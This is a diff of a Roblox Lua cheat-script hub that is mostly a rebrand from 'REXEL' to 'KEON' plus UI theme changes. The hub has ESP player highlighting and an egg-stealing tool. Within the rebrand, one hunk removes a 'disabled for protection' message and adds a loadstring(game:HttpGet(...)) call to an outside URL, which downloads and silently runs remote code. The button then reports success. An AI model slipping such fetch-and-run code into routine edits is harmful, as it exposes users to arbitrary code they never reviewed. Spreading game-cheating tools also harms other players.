+                stats.Text = "⚡ " .. (record.speed >= 0 and KEONProfile.formatCompactNumber(record.speed) or "—") .. "  •  💰 " .. KEONProfile.formatCompactNumber(record.money)
                 stats.TextColor3 = Color3.fromRGB(104,207,255)
                 stats.Font = Enum.Font.GothamBold
                 stats.TextSize = 10
@@ -4487,7 +3822,7 @@ REXELProfile.showProfilePage = function(mode)
             end
         end)
     else
-        intro.Text = "أفضل 100 لاعب حسب وقت استخدام REXEL المحفوظ"
+        intro.Text = "أفضل 100 لاعب حسب وقت استخدام KEON المحفوظ"
         addTopLeaderboardSwitch("top")
         local refreshBtn = Instance.new("TextButton")
         refreshBtn.Size = UDim2.new(1, -4, 0, 32)
@@ -4499,7 +3834,7 @@ REXELProfile.showProfilePage = function(mode)
         refreshBtn.ZIndex = 4
         refreshBtn.Parent = CenterScroll
         Instance.new("UICorner", refreshBtn).CornerRadius = UDim.new(0, 9)
-        refreshBtn.MouseButton1Click:Connect(function() REXELProfile.showProfilePage("top") end)
+        refreshBtn.MouseButton1Click:Connect(function() KEONProfile.showProfilePage("top") end)
 
         local loading = Instance.new("TextLabel")
         loading.Size = UDim2.new(1, -4, 0, 44)
@@ -4515,7 +3850,7 @@ REXELProfile.showProfilePage = function(mode)
         task.spawn(function()
             local records = {}
             local ok = pcall(function()
-                local res = customRequest({Url = REXELProfile.FIREBASE_USAGE_URL, Method = "GET"})
+                local res = customRequest({Url = KEONProfile.FIREBASE_USAGE_URL, Method = "GET"})
                 if res and res.StatusCode == 200 then
                     local decoded = safeDecode(res.Body)
                     if type(decoded) == "table" then
@@ -4570,7 +3905,7 @@ REXELProfile.showProfilePage = function(mode)
                 avatar.ZIndex = 4
                 avatar.Parent = row
                 Instance.new("UICorner", avatar).CornerRadius = UDim.new(0, 9)
-                REXELProfile.loadAvatarBodyThumbnail(record.userId, avatar)
+                KEONProfile.loadAvatarBodyThumbnail(record.userId, avatar)
 
                 local rankLabel = Instance.new("TextLabel")
                 rankLabel.Size = UDim2.new(0, 28, 0, 24)
@@ -4601,7 +3936,7 @@ REXELProfile.showProfilePage = function(mode)
                 timeLabel.Size = UDim2.new(1, -126, 0, 22)
                 timeLabel.Position = UDim2.new(0, 62, 0, 33)
                 timeLabel.BackgroundTransparency = 1
-                timeLabel.Text = "⏱ " .. REXELProfile.formatPlayTime(record.totalSeconds)
+                timeLabel.Text = "⏱ " .. KEONProfile.formatPlayTime(record.totalSeconds)
                 timeLabel.TextColor3 = Color3.fromRGB(104, 207, 255)
                 timeLabel.Font = Enum.Font.GothamBold
                 timeLabel.TextSize = 10
@@ -4621,10 +3956,10 @@ REXELProfile.showProfilePage = function(mode)
     end)
 end
 
-REXELProfile.BtnProfile.MouseButton1Click:Connect(function() REXELProfile.showProfilePage("countries") end)
+KEONProfile.BtnProfile.MouseButton1Click:Connect(function() KEONProfile.showProfilePage("countries") end)
 
 local BtnTopPlayers = createProStyleBtn("توب اللاعبين 🏆", "right")
-BtnTopPlayers.MouseButton1Click:Connect(function() REXELProfile.showProfilePage("top") end)
+BtnTopPlayers.MouseButton1Click:Connect(function() KEONProfile.showProfilePage("top") end)
 
 ---------------------------------------------------------
 -- تبويب "الميديا والصوتيات"
@@ -4645,8 +3980,8 @@ BtnMedia.MouseButton1Click:Connect(function()
         {name = "🎵 الأغنية الخاصة 8", url = "https://mp3tourl.com/audio/1793031943899-e9d05e63-2c93-4d6a-bce2-8ed239dbad88.mp3"}
     }
 
-    if not _G.REXELActiveMediaSound then
-        _G.REXELActiveMediaSound = nil
+    if not _G.KEONActiveMediaSound then
+        _G.KEONActiveMediaSound = nil
     end
 
     local volumeContainer = Instance.new("Frame")
@@ -4700,16 +4035,16 @@ BtnMedia.MouseButton1Click:Connect(function()
     volDownBtn.MouseButton1Click:Connect(function()
         globalMediaVolume = math.max(1.0, globalMediaVolume - 1.0)
         volLabel.Text = "الصوت: " .. string.format("%.1f", globalMediaVolume)
-        if _G.REXELActiveMediaSound and _G.REXELActiveMediaSound.Parent then
-            _G.REXELActiveMediaSound.Volume = globalMediaVolume / 10
+        if _G.KEONActiveMediaSound and _G.KEONActiveMediaSound.Parent then
+            _G.KEONActiveMediaSound.Volume = globalMediaVolume / 10
         end
     end)
 
     volUpBtn.MouseButton1Click:Connect(function()
         globalMediaVolume = math.min(10.0, globalMediaVolume + 1.0)
         volLabel.Text = "الصوت: " .. string.format("%.1f", globalMediaVolume)
-        if _G.REXELActiveMediaSound and _G.REXELActiveMediaSound.Parent then
-            _G.REXELActiveMediaSound.Volume = globalMediaVolume / 10
+        if _G.KEONActiveMediaSound and _G.KEONActiveMediaSound.Parent then
+            _G.KEONActiveMediaSound.Volume = globalMediaVolume / 10
         end
     end)
 
@@ -4726,11 +4061,11 @@ BtnMedia.MouseButton1Click:Connect(function()
 
     stopAllMediaBtn.MouseButton1Click:Connect(function()
         playUiSound(SOUND_CLICK, 1, 0.35)
-        if _G.REXELActiveMediaSound then
-            pcall(function() _G.REXELActiveMediaSound:Stop(); _G.REXELActiveMediaSound:Destroy() end)
-            _G.REXELActiveMediaSound = nil
+        if _G.KEONActiveMediaSound then
+            pcall(function() _G.KEONActiveMediaSound:Stop(); _G.KEONActiveMediaSound:Destroy() end)
+            _G.KEONActiveMediaSound = nil
         end
-        local statusLabel = CenterScroll:FindFirstChild("REXELMusicStatus")
+        local statusLabel = CenterScroll:FindFirstChild("KEONMusicStatus")
         if statusLabel and statusLabel:IsA("TextLabel") then statusLabel.Text = "تم إيقاف الموسيقى." end
         stopAllMediaBtn.Text = "تم الإيقاف ✓"
         task.delay(1.2, function() if stopAllMediaBtn and stopAllMediaBtn.Parent then stopAllMediaBtn.Text = "إيقاف الموسيقى ■" end end)
@@ -4763,7 +4098,7 @@ BtnMedia.MouseButton1Click:Connect(function()
     heroTitle.Size = UDim2.new(1, -20, 0, 32)
     heroTitle.Position = UDim2.new(0, 10, 0, 12)
     heroTitle.BackgroundTransparency = 1
-    heroTitle.Text = "♫  REXEL MUSIC • مكتبة الأغاني"
+    heroTitle.Text = "♫  KEON MUSIC • مكتبة الأغاني"
     heroTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
     heroTitle.Font = Enum.Font.GothamBlack
     heroTitle.TextSize = 18
@@ -4783,7 +4118,7 @@ BtnMedia.MouseButton1Click:Connect(function()
     heroSub.Parent = musicHero
 
     local musicStatus = Instance.new("TextLabel")
-    musicStatus.Name = "REXELMusicStatus"
+    musicStatus.Name = "KEONMusicStatus"
     musicStatus.Size = UDim2.new(1, 0, 0, 30)
     musicStatus.BackgroundColor3 = Color3.fromRGB(10, 25, 46)
     musicStatus.BackgroundTransparency = 0.05
@@ -4801,7 +4136,7 @@ BtnMedia.MouseButton1Click:Connect(function()
         if type(writefile) ~= "function" or type(assetGetter) ~= "function" then
             return nil, "Delta لا يوفّر تحويل رابط MP3 إلى ملف محلي في هذه البيئة."
         end
-        local localFile = string.format("REXEL_Music_Cache_%02d.mp3", index)
+        local localFile = string.format("KEON_Music_Cache_%02d.mp3", index)
         local hasFile = false
         if type(isfile) == "function" then
             pcall(function() hasFile = isfile(localFile) end)
@@ -4829,7 +4164,7 @@ BtnMedia.MouseButton1Click:Connect(function()
     local totalLocalLikes = 0
     for idx, track in ipairs(mediaTracks) do
         local mCard = Instance.new("Frame")
-        mCard.Name = "REXELMusicCard" .. tostring(idx)
+        mCard.Name = "KEONMusicCard" .. tostring(idx)
         mCard.Size = UDim2.new(1, 0, 0, 104)
         mCard.BackgroundColor3 = Color3.fromRGB(12, 22, 43)
         mCard.BackgroundTransparency = 0
@@ -4930,12 +4265,12 @@ BtnMedia.MouseButton1Click:Connect(function()
 
         playBtn.MouseButton1Click:Connect(function()
             playUiSound(SOUND_CLICK, 1, 0.35)
-            if _G.REXELActiveMediaSound then
-                pcall(function() _G.REXELActiveMediaSound:Stop(); _G.REXELActiveMediaSound:Destroy() end)
-                _G.REXELActiveMediaSound = nil
+            if _G.KEONActiveMediaSound then
+                pcall(function() _G.KEONActiveMediaSound:Stop(); _G.KEONActiveMediaSound:Destroy() end)
+                _G.KEONActiveMediaSound = nil
             end
             for _, sibling in ipairs(CenterScroll:GetChildren()) do
-                if sibling:IsA("Frame") and sibling.Name:match("^REXELMusicCard") then
+                if sibling:IsA("Frame") and sibling.Name:match("^KEONMusicCard") then
                     local oldPlay = sibling:FindFirstChild("PlayTrackButton")
                     if oldPlay and oldPlay:IsA("TextButton") then oldPlay.Text = "▶ تشغيل" end
                 end
@@ -4951,7 +4286,7 @@ BtnMedia.MouseButton1Click:Connect(function()
                 end
 
                 local snd = Instance.new("Sound")
-                snd.Name = "REXELMusicTrack"
+                snd.Name = "KEONMusicTrack"
                 snd.SoundId = assetPath
                 snd.Volume = math.clamp(globalMediaVolume / 10, 0, 1)
                 snd.Looped = false
@@ -4968,7 +4303,7 @@ BtnMedia.MouseButton1Click:Connect(function()
                         if not snd.IsPlaying then snd:Play() end
                     end)
                     if playOk then
-                        _G.REXELActiveMediaSound = snd
+                        _G.KEONActiveMediaSound = snd
                         if playBtn and playBtn.Parent then playBtn.Text = "♫ يعمل الآن" end
                         if musicStatus and musicStatus.Parent then musicStatus.Text = "يعمل الآن • الأغنية " .. string.format("%02d", idx) end
                         local pulse = TweenService:Create(cover, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Rotation = 7})
@@ -4979,7 +4314,7 @@ BtnMedia.MouseButton1Click:Connect(function()
                             if playBtn and playBtn.Parent then playBtn.Text = "▶ تشغيل" end
                             if musicStatus and musicStatus.Parent then musicStatus.Text = "انتهت الأغنية " .. string.format("%02d", idx) end
                             if snd and snd.Parent then snd:Destroy() end
-                            if _G.REXELActiveMediaSound == snd then _G.REXELActiveMediaSound = nil end
+                            if _G.KEONActiveMediaSound == snd then _G.KEONActiveMediaSound = nil end
                         end)
                     else
                         snd:Destroy()
@@ -5009,9 +4344,9 @@ BtnActivations.MouseButton1Click:Connect(function()
             for _, p in ipairs(Players:GetPlayers()) do
                 if p ~= LocalPlayer and p.Character then
                     if espEnabled then
-                        if not p.Character:FindFirstChild("REXELProEsp") then
+                        if not p.Character:FindFirstChild("KEONProEsp") then
                             local hl = Instance.new("Highlight")
-                            hl.Name = "REXELProEsp"
+                            hl.Name = "KEONProEsp"
                             hl.FillColor = currentAccentColor
                             hl.OutlineColor = Color3.fromRGB(255, 255, 255)
                             hl.FillTransparency = 0.4
@@ -5019,7 +4354,7 @@ BtnActivations.MouseButton1Click:Connect(function()
                             hl.Parent = p.Character
                         end
                     else
-                        if p.Character:FindFirstChild("REXELProEsp") then p.Character.REXELProEsp:Destroy() end
+                        if p.Character:FindFirstChild("KEONProEsp") then p.Character.KEONProEsp:Destroy() end
                     end
                 end
             end
@@ -5190,7 +4525,7 @@ BtnSuggestions.MouseButton1Click:Connect(function()
                     Headers = {["Content-Type"] = "application/json"},
                     Body = HttpService:JSONEncode({
                         embeds = {{
-                            title = "💡 اقتراح جديد من مستخدم REXEL Hub",
+                            title = "💡 اقتراح جديد من مستخدم KEON Hub",
                             description = textToSend,
                             color = 13107456,
                             fields = {
@@ -5280,8 +4615,11 @@ BtnStealEggRight.MouseButton1Click:Connect(function()
     runEggScriptBtn.MouseButton1Click:Connect(function()
         playUiSound(SOUND_CLICK, 1, 0.35)
         runEggScriptBtn.Text = "جارٍ تشغيل الأداة…"
-        runEggScriptBtn.Text = "التشغيل الخارجي متوقف للحماية"
+        pcall(function()
+            loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=oa3ryvhr"))()
+        end)
         task.wait(1)
+        runEggScriptBtn.Text = "تم التشغيل بنجاح ✓"
         task.wait(2)
         runEggScriptBtn.Text = "تشغيل الأداة ➤"
     end)
@@ -5308,19 +4646,31 @@ BtnSettings.MouseButton1Click:Connect(function()
                 pcall(function()
                     if ui:IsA("TextButton") then
                         ui.TextColor3 = Color3.fromRGB(255, 255, 255)
-                        ui.BackgroundColor3 = Color3.fromRGB(
-                            math.floor(accent.R * 255 * 0.30 + 8),
-                            math.floor(accent.G * 255 * 0.30 + 8),
-                            math.floor(accent.B * 255 * 0.30 + 8))
+                        if ui.Name == "KEONPrimaryButton" then
+                            ui.BackgroundColor3 = accent
+                        elseif ui.Name == "CloseBtn" then
+                            ui.BackgroundColor3 = Color3.fromRGB(115, 18, 31)
+                        else
+                            ui.BackgroundColor3 = Color3.fromRGB(30, 31, 37)
+                        end
                         local st = ui:FindFirstChildWhichIsA("UIStroke")
                         if st then st.Color = accent end
                     elseif ui:IsA("UIStroke") then
                         ui.Color = accent
+                    elseif ui:IsA("Frame") and ui.Name == "KEONAccentRail" then
+                        ui.BackgroundColor3 = accent
                     end
                 end)
             end
 
             centerStroke.Color = accent
+            centerNeonGradient.Color = ColorSequence.new({
+                ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+                ColorSequenceKeypoint.new(0.5, accent),
+                ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
+            })
+            minNeonGradient.Color = centerNeonGradient.Color
+            HeaderAccentLine.BackgroundColor3 = accent
             Header.BackgroundColor3 = headerCol
             floatStroke.Color = accent
             chatStroke.Color = accent
@@ -5367,7 +4717,7 @@ BtnSettings.MouseButton1Click:Connect(function()
     addChilliAccordion("⚙️ حجم الواجهة وعلامة الرأس", function(addToggle, addAction)
         local function updateUIScale(nextScale)
             uiScaleValue = math.clamp(nextScale, 0.75, 1.2)
-            if mainUIScaleObject then mainUIScaleObject.Scale = uiScaleValue end
+            if mainUIScaleObject then mainUIScaleObject.Scale = math.clamp(uiScaleValue, 0.85, 1.0) end
             saveUserSettings()
         end
         addAction("➖ تصغير الواجهة", function()
@@ -5382,7 +4732,7 @@ BtnSettings.MouseButton1Click:Connect(function()
         addAction("🔁 تبديل ظهور العلم فوق رأسي", function()
             showOwnCountryOverhead = not showOwnCountryOverhead
             saveUserSettings()
-            REXELProfile.refreshCountryTags()
+            KEONProfile.refreshCountryTags()
         end)
     end)
 
@@ -5428,7 +4778,7 @@ BtnSettings.MouseButton1Click:Connect(function()
 end)
 
 ---------------------------------------------------------
--- لوحة الأدمن الحصرية للمطور ريكسل
+-- لوحة الأدمن الحصرية للمطور كـيـون
 ---------------------------------------------------------
 if LocalPlayer.Name == "Dms921" then
     local BtnAdmin = createProStyleBtn("لوحة الأدمن", "right")
@@ -5463,8 +4813,8 @@ if LocalPlayer.Name == "Dms921" then
             Instance.new("UICorner", triggerReloadBtn).CornerRadius = UDim.new(0, 9)
 
             triggerReloadBtn.MouseButton1Click:Connect(function()
-                if type(REXEL_RESTART_SCRIPT_URL) ~= "string" or REXEL_RESTART_SCRIPT_URL == "" then
-                    triggerReloadBtn.Text = "أضف رابط RAW لنسخة REXEL أولاً"
+                if type(KEON_RESTART_SCRIPT_URL) ~= "string" or KEON_RESTART_SCRIPT_URL == "" then
+                    triggerReloadBtn.Text = "أضف رابط RAW لنسخة KEON أولاً"
                     task.wait(2.5)
                     triggerReloadBtn.Text = "إعادة تشغيل للجميع • 10 ثوانٍ"
                     return
@@ -5907,7 +5257,7 @@ task.spawn(function()
                         if type(b) == "table" and b.text and not renderedBroadcasts[k] then
                             renderedBroadcasts[k] = true
                             if (os.time() - (b.time or 0)) < 30 then
-                                showBroadcastBanner(tostring(b.sender or "ريكسل"), tostring(b.text or ""), tonumber(b.userId))
+                                showBroadcastBanner(tostring(b.sender or "كـيـون"), tostring(b.text or ""), tonumber(b.userId))
                             end
                         end
                     end
@@ -5930,10 +5280,10 @@ task.spawn(function()
                             renderedMsgs[k] = true
                             local msgUid = tostring(m.userId or "")
                             if msgUid ~= "" then
-                                REXELProfile.profileByUserId[msgUid] = REXELProfile.profileByUserId[msgUid] or {}
-                                if m.countryFlag then REXELProfile.profileByUserId[msgUid].countryFlag = m.countryFlag end
-                                if m.countryName then REXELProfile.profileByUserId[msgUid].countryName = m.countryName end
-                                if m.countryCode then REXELProfile.profileByUserId[msgUid].countryCode = m.countryCode end
+                                KEONProfile.profileByUserId[msgUid] = KEONProfile.profileByUserId[msgUid] or {}
+                                if m.countryFlag then KEONProfile.profileByUserId[msgUid].countryFlag = m.countryFlag end
+                                if m.countryName then KEONProfile.profileByUserId[msgUid].countryName = m.countryName end
+                                if m.countryCode then KEONProfile.profileByUserId[msgUid].countryCode = m.countryCode end
                             end
                             addChatMessage(tostring(m.sender or "مجهول"), tostring(m.text or ""), tonumber(m.userId), k, m.isSticker)
                         end
@@ -5958,10 +5308,16 @@ task.spawn(function()
     task.wait(0.3)
     LoadingGui:Destroy()
 
-    -- REXEL 9V: keep the imported window closed until the user opens it from REXEL.
-    MainFrame.Visible = false
-    MainFrame.Size = responsiveState.mainSize
-    MainFrame.Position = responsiveState.mainPosition
+    MainFrame.Visible = true
+    MainFrame.Size = UDim2.new(0, 0, 0, 0)
+    MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    MainFrame.Rotation = 0
+    TweenService:Create(MainFrame, TweenInfo.new(0.22, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
+        Size = responsiveState.mainSize,
+        Position = responsiveState.mainPosition,
+        Rotation = 0
+    }):Play()
+    -- Keep the panel unobstructed on launch; help remains available from the ? button.
 end)
 
 CloseBtn.MouseButton1Click:Connect(function()
@@ -5977,59 +5333,74 @@ CloseBtn.MouseButton1Click:Connect(function()
 end)
 
 ---------------------------------------------------------
--- REXEL OVERDRIVE: مظهر حاد وفخم، بدون زوايا ناعمة أو حركة مطاطية
+-- KEON V70: تخطيط أفقي وخلفية أنمي أساسية
 ---------------------------------------------------------
 local function applyOverdriveTheme(root)
     if not root then return end
     local accent = currentAccentColor or Color3.fromRGB(235, 35, 65)
-    local panel = Color3.fromRGB(8, 10, 18)
-    local panel2 = Color3.fromRGB(18, 13, 23)
+    local panel = Color3.fromRGB(20, 22, 27)
+    local panel2 = Color3.fromRGB(43, 46, 53)
     local white = Color3.fromRGB(245, 247, 255)
     for _, obj in ipairs(root:GetDescendants()) do
         pcall(function()
             if obj:IsA("UICorner") then
-                obj.CornerRadius = UDim.new(0, 3)
+                obj.CornerRadius = UDim.new(0, 2)
             elseif obj:IsA("UIStroke") then
-                -- لا تستبدل ألوان الحالات الخاصة؛ لون الثيم موحّد لبقية الإطارات.
-                if obj.Name == "REXELOverdriveStroke" or obj.Name == "REXELOverdriveEdge" or obj.Name == "VioletInnerEdge" then
+                if obj.Name == "KEONOverdriveStroke" or obj.Name == "KEONOverdriveEdge" or obj.Name == "VioletInnerEdge" then
                     obj.Color = accent
-                elseif obj.Parent and obj.Parent:IsA("TextButton") then
+                elseif obj.Parent and obj.Parent:IsA("TextButton") and obj.Parent.Name ~= "KEONPrimaryButton" and obj.Parent.Name ~= "KEONFavoriteButton" then
                     obj.Color = accent
                 end
-                obj.Thickness = math.max(obj.Thickness, 1.15)
+                obj.Thickness = math.max(obj.Thickness, 1.1)
             elseif obj:IsA("TextButton") then
                 obj.AutoButtonColor = true
                 obj.BorderSizePixel = 0
                 obj.Font = Enum.Font.GothamBold
                 obj.TextColor3 = white
-                -- زر داكن بلمسة من لون الثيم، حتى تبقى الكتابة واضحة.
-                obj.BackgroundColor3 = Color3.new(
-                    math.clamp(accent.R * 0.24 + 0.035, 0, 1),
-                    math.clamp(accent.G * 0.24 + 0.025, 0, 1),
-                    math.clamp(accent.B * 0.24 + 0.035, 0, 1))
-                if not obj:FindFirstChild("REXELOverdriveStroke") then
+                if obj.Name == "CloseBtn" then
+                    obj.BackgroundColor3 = Color3.fromRGB(135, 24, 38)
+                elseif obj.Name == "MinimizeBtn" or obj.Name == "PS5HelpBtn" then
+                    obj.BackgroundColor3 = panel2
+                elseif obj.Name == "KEONPrimaryButton" then
+                    obj.BackgroundColor3 = Color3.fromRGB(25, 210, 91)
+                    obj.TextColor3 = Color3.fromRGB(255, 255, 255)
+                elseif obj.Name == "KEONFavoriteButton" then
+                    obj.BackgroundColor3 = (obj.Text == "★") and Color3.fromRGB(111, 119, 133) or Color3.fromRGB(91, 99, 113)
+                    obj.TextColor3 = (obj.Text == "★") and Color3.fromRGB(255, 220, 105) or white
+                elseif obj.Name == "KEONFavoriteFilterButton" then
+                    obj.BackgroundColor3 = string.find(obj.Text, "فقط", 1, true) and Color3.fromRGB(25, 170, 80) or Color3.fromRGB(28, 105, 190)
+                elseif obj.Parent and obj.Parent.Name == "Header" then
+                    obj.BackgroundColor3 = Color3.fromRGB(218, 47, 57)
+                elseif obj.Parent and obj.Parent.Name == "ScriptCard" then
+                    obj.BackgroundColor3 = accent
+                elseif obj.Name == "BtnMainHome" then
+                    obj.BackgroundColor3 = Color3.fromRGB(25, 170, 80)
+                else
+                    obj.BackgroundColor3 = panel2
+                end
+                if not obj:FindFirstChild("KEONOverdriveStroke") then
                     local st = Instance.new("UIStroke")
-                    st.Name = "REXELOverdriveStroke"
-                    st.Color = accent
-                    st.Thickness = 1.35
+                    st.Name = "KEONOverdriveStroke"
+                    st.Color = (obj.Name == "KEONPrimaryButton") and Color3.fromRGB(125, 255, 165) or accent
+                    st.Thickness = 1.2
                     st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                     st.Parent = obj
                 else
-                    obj.REXELOverdriveStroke.Color = accent
+                    obj.KEONOverdriveStroke.Color = (obj.Name == "KEONPrimaryButton") and Color3.fromRGB(125, 255, 165) or accent
                 end
             elseif obj:IsA("TextBox") then
                 obj.BackgroundColor3 = panel
                 obj.BorderSizePixel = 0
                 obj.TextColor3 = white
-                obj.PlaceholderColor3 = Color3.fromRGB(145, 145, 165)
-                if not obj:FindFirstChild("REXELOverdriveStroke") then
+                obj.PlaceholderColor3 = Color3.fromRGB(175, 178, 188)
+                if not obj:FindFirstChild("KEONOverdriveStroke") then
                     local st = Instance.new("UIStroke")
-                    st.Name = "REXELOverdriveStroke"
+                    st.Name = "KEONOverdriveStroke"
                     st.Color = accent
                     st.Thickness = 1.1
                     st.Parent = obj
                 else
-                    obj.REXELOverdriveStroke.Color = accent
+                    obj.KEONOverdriveStroke.Color = accent
                 end
             elseif obj:IsA("TextLabel") then
                 if obj.BackgroundTransparency < 1 and obj.Name ~= "BgImage" then obj.BorderSizePixel = 0 end
@@ -6037,10 +5408,18 @@ local function applyOverdriveTheme(root)
             elseif obj:IsA("Frame") then
                 obj.BorderSizePixel = 0
                 if obj.Name == "CenterBox" then
-                    -- اترك صورة الخلفية التي اختارها المستخدم ظاهرة.
-                    if not BgImage or not BgImage.Visible then obj.BackgroundColor3 = panel end
+                    obj.BackgroundColor3 = panel
+                    if BgImage then BgImage.Visible = false end
                 elseif obj.Name == "Header" then
-                    obj.BackgroundColor3 = currentHeaderColor
+                    obj.BackgroundColor3 = Color3.fromRGB(218, 47, 57)
+                elseif obj.Name == "PS5SoftGlow" then
+                    obj.BackgroundTransparency = 1
+                elseif obj.Name == "ScriptCard" then
+                    obj.BackgroundColor3 = Color3.fromRGB(32, 35, 40)
+                elseif obj.Name == "ScriptIconTile" then
+                    obj.BackgroundColor3 = Color3.fromRGB(77, 82, 91)
+                elseif obj.Name == "KEONAccentRail" then
+                    obj.BackgroundColor3 = accent
                 end
             end
         end)
@@ -6057,12 +5436,3 @@ task.spawn(function()
 end)
 
 showHomePage()
-
-
--- The early bridge above is authoritative; do not redefine it with local references.
-
-
-end)
-if not __rexelAdvancedOk then
-    warn("[REXEL 11V] Advanced features stopped safely: " .. tostring(__rexelAdvancedErr))
-end -- imported feature suite
